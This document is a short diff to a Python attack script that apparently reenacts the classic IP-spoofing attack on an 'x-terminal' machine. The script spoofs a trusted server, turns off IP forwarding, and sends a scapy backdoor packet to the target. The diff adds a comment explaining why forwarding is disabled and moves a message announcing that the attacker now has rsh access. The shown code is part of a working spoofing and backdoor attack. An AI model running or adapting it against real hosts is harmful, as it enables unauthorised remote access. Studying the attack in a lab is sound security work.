@@ -40,6 +40,7 @@ def spoof_loop():
     spoof()
     sleep(SPOOF_DELAY)
 
+# It's necessary to disable ip forwarding, because if its active the attacker host will send ICMP packet to x-terminal telling to redirect packets to trusted server.
 def disable_ip_forward(): 
   os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
 
@@ -91,12 +92,11 @@ if __name__ == "__main__":
       scapy.send(backdoor_packet, verbose=False)
 
       print(f"Backdoor packet SENT from {TRUSTED_SERVER_IP}:{SOURCE_PORT} to {X_TERMINAL_IP}:{TARGET_PORT}")
+      print(f"\nAt this point, you may have remote access via rsh with xterminal. When this script stops running, just type on terminal the following command: rsh {X_TERMINAL_IP}. Bye bye :)")
     else: 
       print("Failed to establish rlogin connection.")
   else:
     print("Handshake failed.")
-
-  print(f"\nAt this point, you may have remote access via rsh with xterminal. When this script stops running, just type on terminal the following command: rsh {X_TERMINAL_IP}. Bye bye :)")
 
   stop_spoofing = True
 
